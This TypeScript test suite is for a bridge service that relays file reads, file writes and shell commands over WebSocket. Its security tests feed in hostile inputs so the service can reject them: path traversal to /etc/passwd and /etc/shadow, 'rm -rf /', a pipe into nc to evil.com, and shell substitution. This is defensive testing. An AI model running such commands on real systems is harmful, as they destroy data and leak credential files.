import { afterEach, beforeEach, describe, expect, mock, test } from 'bun:test';
import type { BridgeCapabilities, BridgeRequest, BridgeResponse } from '../../shared/bridge-protocol';
import {
  BridgeService,
  MAX_COMMAND_LENGTH,
  MAX_CONTENT_LENGTH,
  MAX_PATH_LENGTH,
  RATE_LIMIT_MAX_REQUESTS,
} from './service';

function makeMockWs() {
  return { send: mock(() => {}), close: mock(() => {}), readyState: 1 } as any;
}

const fullCaps: BridgeCapabilities = { read: true, write: true, exec: true };
const readOnlyCaps: BridgeCapabilities = { read: true, write: false, exec: false };

describe('BridgeService', () => {
  let service: BridgeService;

  beforeEach(() => {
    service = new BridgeService();
  });

  afterEach(() => {
    service.dispose();
  });

  test('listSessions() returns empty array initially', () => {
    expect(service.listSessions()).toEqual([]);
  });

  test('registerSession() adds a session (verify via listSessions)', () => {
    const ws = makeMockWs();
    service.registerSession('sess-1', 'My Bridge', 'proj-1', fullCaps, ws);
    const sessions = service.listSessions();
    expect(sessions).toHaveLength(1);
    expect(sessions[0].sessionId).toBe('sess-1');
    expect(sessions[0].label).toBe('My Bridge');
    expect(sessions[0].projectId).toBe('proj-1');
    expect(sessions[0].capabilities).toEqual(fullCaps);
  });

  test('removeSession() removes a session', () => {
    const ws = makeMockWs();
    service.registerSession('sess-2', 'Bridge 2', 'proj-2', fullCaps, ws);
    expect(service.listSessions()).toHaveLength(1);
    service.removeSession('sess-2');
    expect(service.listSessions()).toHaveLength(0);
  });

  test('getSession() returns session by ID, undefined for unknown', () => {
    const ws = makeMockWs();
    service.registerSession('sess-3', 'Bridge 3', 'proj-3', fullCaps, ws);
    const found = service.getSession('sess-3');
    expect(found).toBeDefined();
    expect(found?.sessionId).toBe('sess-3');
    expect(service.getSession('nonexistent')).toBeUndefined();
  });

  test('sendRequest() rejects if session not found with "Bridge session not found"', async () => {
    const request: BridgeRequest = { id: 'req-1', type: 'file.read', path: '/foo' };
    await expect(service.sendRequest('no-such-session', request)).rejects.toThrow('Bridge session not found');
  });

  test('sendRequest() sends JSON to WebSocket, then simulate response via handleResponse() and verify result', async () => {
    const ws = makeMockWs();
    service.registerSession('sess-4', 'Bridge 4', 'proj-4', fullCaps, ws);

    const request: BridgeRequest = { id: 'req-2', type: 'file.read', path: '/bar' };
    const responsePromise = service.sendRequest('sess-4', request);

    expect(ws.send).toHaveBeenCalledTimes(1);
    const sentArg = ws.send.mock.calls[0][0] as string;
    expect(JSON.parse(sentArg)).toMatchObject({ id: 'req-2', type: 'file.read' });

    const mockResponse: BridgeResponse = { id: 'req-2', type: 'file.read', success: true, data: 'file contents' };
    service.handleResponse('sess-4', mockResponse);

    const result = await responsePromise;
    expect(result).toEqual(mockResponse);
  });

  test('sendRequest() rejects on timeout (50ms)', async () => {
    const ws = makeMockWs();
    service.registerSession('sess-5', 'Bridge 5', 'proj-5', fullCaps, ws);

    const request: BridgeRequest = { id: 'req-3', type: 'ping' };
    await expect(service.sendRequest('sess-5', request, 50)).rejects.toThrow(/timeout/i);
  });

  test('sendRequest() rejects if capability not granted (file.write on read-only session)', async () => {
    const ws = makeMockWs();
    service.registerSession('sess-6', 'Read-Only Bridge', 'proj-6', readOnlyCaps, ws);

    const request: BridgeRequest = { id: 'req-4', type: 'file.write', path: '/secret', content: 'data' };
    await expect(service.sendRequest('sess-6', request)).rejects.toThrow(/capability/i);
  });

  // ─── Path traversal prevention ─────────────────────────────────────────────

  test('rejects path traversal with ".."', async () => {
    const ws = makeMockWs();
    service.registerSession('s-pt', 'test', 'p', fullCaps, ws);
    const req: BridgeRequest = { id: 'r1', type: 'file.read', path: '../../etc/passwd' };
    await expect(service.sendRequest('s-pt', req)).rejects.toThrow(/traversal/i);
  });

  test('rejects relative path traversal escaping cwd', async () => {
    const ws = makeMockWs();
    service.registerSession('s-pt2', 'test', 'p', fullCaps, ws);
    const req: BridgeRequest = { id: 'r2', type: 'file.read', path: 'src/../../etc/shadow' };
    await expect(service.sendRequest('s-pt2', req)).rejects.toThrow(/traversal/i);
  });

  test('rejects paths containing null bytes', async () => {
    const ws = makeMockWs();
    service.registerSession('s-null', 'test', 'p', fullCaps, ws);
    const req: BridgeRequest = { id: 'r3', type: 'file.read', path: '/foo\0bar' };
    await expect(service.sendRequest('s-null', req)).rejects.toThrow(/null/i);
  });

  test('allows legitimate paths without traversal', async () => {
    const ws = makeMockWs();
    service.registerSession('s-ok', 'test', 'p', fullCaps, ws);
    const req: BridgeRequest = { id: 'r4', type: 'file.read', path: '/home/user/project/src/index.ts' };
    // Should not throw — will send to WS (won't resolve since no response, but send proves validation passed)
    service.sendRequest('s-ok', req, 50).catch(() => {});
    expect(ws.send).toHaveBeenCalledTimes(1);
  });

  // ─── Payload size limits ───────────────────────────────────────────────────

  test('rejects path exceeding max length', async () => {
    const ws = makeMockWs();
    service.registerSession('s-pl', 'test', 'p', fullCaps, ws);
    const req: BridgeRequest = { id: 'r5', type: 'file.read', path: 'a'.repeat(MAX_PATH_LENGTH + 1) };
    await expect(service.sendRequest('s-pl', req)).rejects.toThrow(/path exceeds/i);
  });

  test('rejects content exceeding max size', async () => {
    const ws = makeMockWs();
    service.registerSession('s-cl', 'test', 'p', fullCaps, ws);
    const req: BridgeRequest = {
      id: 'r6',
      type: 'file.write',
      path: '/foo',
      content: 'x'.repeat(MAX_CONTENT_LENGTH + 1),
    };
    await expect(service.sendRequest('s-cl', req)).rejects.toThrow(/content exceeds/i);
  });

  test('rejects command exceeding max length', async () => {
    const ws = makeMockWs();
    service.registerSession('s-cmd', 'test', 'p', fullCaps, ws);
    const req: BridgeRequest = { id: 'r7', type: 'exec', command: 'a'.repeat(MAX_COMMAND_LENGTH + 1) };
    await expect(service.sendRequest('s-cmd', req)).rejects.toThrow(/command exceeds/i);
  });

  // ─── Command injection prevention ─────────────────────────────────────────

  test('rejects commands with shell metacharacters (semicolon)', async () => {
    const ws = makeMockWs();
    service.registerSession('s-ci1', 'test', 'p', fullCaps, ws);
    const req: BridgeRequest = { id: 'r8', type: 'exec', command: 'ls; rm -rf /' };
    await expect(service.sendRequest('s-ci1', req)).rejects.toThrow(/metacharacter/i);
  });

  test('rejects commands with pipe operator', async () => {
    const ws = makeMockWs();
    service.registerSession('s-ci2', 'test', 'p', fullCaps, ws);
    const req: BridgeRequest = { id: 'r9', type: 'exec', command: 'cat /etc/passwd | nc evil.com 1234' };
    await expect(service.sendRequest('s-ci2', req)).rejects.toThrow(/metacharacter/i);
  });

  test('rejects commands with backticks', async () => {
    const ws = makeMockWs();
    service.registerSession('s-ci3', 'test', 'p', fullCaps, ws);
    const req: BridgeRequest = { id: 'r10', type: 'exec', command: 'echo `whoami`' };
    await expect(service.sendRequest('s-ci3', req)).rejects.toThrow(/metacharacter/i);
  });

  test('rejects commands with $() substitution', async () => {
    const ws = makeMockWs();
    service.registerSession('s-ci4', 'test', 'p', fullCaps, ws);
    const req: BridgeRequest = { id: 'r11', type: 'exec', command: 'echo $(whoami)' };
    await expect(service.sendRequest('s-ci4', req)).rejects.toThrow(/metacharacter/i);
  });

  test('rejects dangerous commands like rm -rf', async () => {
    const ws = makeMockWs();
    service.registerSession('s-ci5', 'test', 'p', fullCaps, ws);
    const req: BridgeRequest = { id: 'r12', type: 'exec', command: 'rm -rf /home/user' };
    await expect(service.sendRequest('s-ci5', req)).rejects.toThrow(/blocked pattern/i);
  });

  test('allows safe commands like ls and git status', async () => {
    const ws = makeMockWs();
    service.registerSession('s-safe', 'test', 'p', fullCaps, ws);
    const req: BridgeRequest = { id: 'r13', type: 'exec', command: 'git status' };
    service.sendRequest('s-safe', req, 50).catch(() => {});
    expect(ws.send).toHaveBeenCalledTimes(1);
  });

  // ─── Rate limiting ─────────────────────────────────────────────────────────

  test('enforces rate limit per session', async () => {
    const ws = makeMockWs();
    service.registerSession('s-rl', 'test', 'p', fullCaps, ws);

    for (let i = 0; i < RATE_LIMIT_MAX_REQUESTS; i++) {
      const req: BridgeRequest = { id: `rl-${i}`, type: 'ping' };
      service.sendRequest('s-rl', req, 50).catch(() => {});
    }

    const overLimit: BridgeRequest = { id: 'rl-over', type: 'ping' };
    await expect(service.sendRequest('s-rl', overLimit)).rejects.toThrow(/rate limit/i);
  });

  // ─── CWD validation ────────────────────────────────────────────────────────

  test('rejects cwd with path traversal', async () => {
    const ws = makeMockWs();
    service.registerSession('s-cwd', 'test', 'p', fullCaps, ws);
    const req: BridgeRequest = { id: 'r14', type: 'exec', command: 'ls', cwd: '../../../' };
    await expect(service.sendRequest('s-cwd', req)).rejects.toThrow(/traversal/i);
  });

  // ─── Dispose cleanup ──────────────────────────────────────────────────────

  test('dispose() cleans up all sessions and timers', () => {
    const ws = makeMockWs();
    service.registerSession('s-disp', 'test', 'p', fullCaps, ws);
    service.dispose();
    expect(service.listSessions()).toHaveLength(0);
  });
});
